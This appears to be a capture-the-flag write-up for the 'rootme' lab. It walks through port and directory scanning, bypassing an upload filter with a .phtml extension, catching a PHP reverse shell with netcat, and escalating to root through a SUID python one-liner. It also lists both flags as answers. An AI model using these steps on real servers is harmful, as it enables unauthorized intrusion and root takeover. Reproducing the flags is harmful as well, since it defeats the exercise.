## rootme

### Tasks

1. Deploy the machine
- Just deploy the machine. 

2. Reconnaissance
- How many ports are open?
This task is quite easy, a default nmap scan would suffice.
`nmap $IP`
There are 2 ports open, port 22 and port 80. Port 22 is generally used for SSH and port 80 is used for HTTP Web Servers.

- What version of Apache is running? 
We can use nmap with -sV (it determines service/version info running on open ports) option. To make things faster we can also specify the ports 80 and 22 (using -p option).
`nmap -sV -p 80, 22 $IP`
Apache Version:- 2.4.29

- What service is running on port 22?
Service scan using nmap will tell us the service running on port 22 is SSH.

- Find directories on the web server using the GoBuster tool.

- What is the hidden directory?
Gobuster is used to bruteforce hidden directories on web servers based on some wordlist. If you don't have a wordlist, you can download it [here](https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt). Alternatively, download it directly from the terminal,
```bash 
wget https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/common.txt
```
`gobuster dir --url $IP --wordlist $WORDLIST_PATH`
Gobuster finds some directories like `/panel/` and `/uploads/`. `/panel/` is the answer to the task.

3. Getting a Shell
Now we have to find the user flag, it is in some file named user.txt (mentioned in task). 

Going on the /panel endpoint, we find that we can upload files there. At this point, the first thing that hits the mind is that their must be a file upload vulnerability. So we uploaded a file with .php extension and the website refuses to accept the file. So we tried changing the extension to .png.php, .php3, .phtml. Changing the extension to .phtml bypasses the security check and our file is uploaded. (File with .php3 extension is also uploaded but it is not executed on the web server).

Now we can use this vulnerability and get a reverse shell. We can use php reverse shell script by pentestmonkey to achieve this. It can be find [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the ip to your ip and port on which you want to listen.

Upload the php-reverse-shell script to the web server (with .phtml extension). 

Listen on the port(for example:1234) for incoming connections.
```bash
nc -lnvp 1234
```

Execute the script on the server by visiting `/uploads/<REV_SHELL_SCRIPT.phtml>`.

Check the nc session. Bingo, you get the reverse shell.

The user flag is in `/var/www/user.txt`. You can use the `find` command to find the file.
```bash
find / -name user.txt 2>/dev/null
```
The flag:- `THM{y0u_g0t_a_sh3ll}`

4. Privilege escalation

- Search for files with SUID permission, which file is weird?
We can find files with suid permission using the find command:-
```bash
find / -perm -u=s 2>/dev/null
```
Ans:- `/usr/bin/python`

- Find a form to escalate your privileges.

We find that python has setuid bit set and the owner is root. We can use this to escalate our privileges. Searching about the vuln at gtfobins, we find that it can be exploited easily:-
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
This gives us the root shell. Going to the root home directory we find the flag in root.txt.

- root.txt
The flag:- `THM{pr1v1l3g3_3sc4l4t10n}`

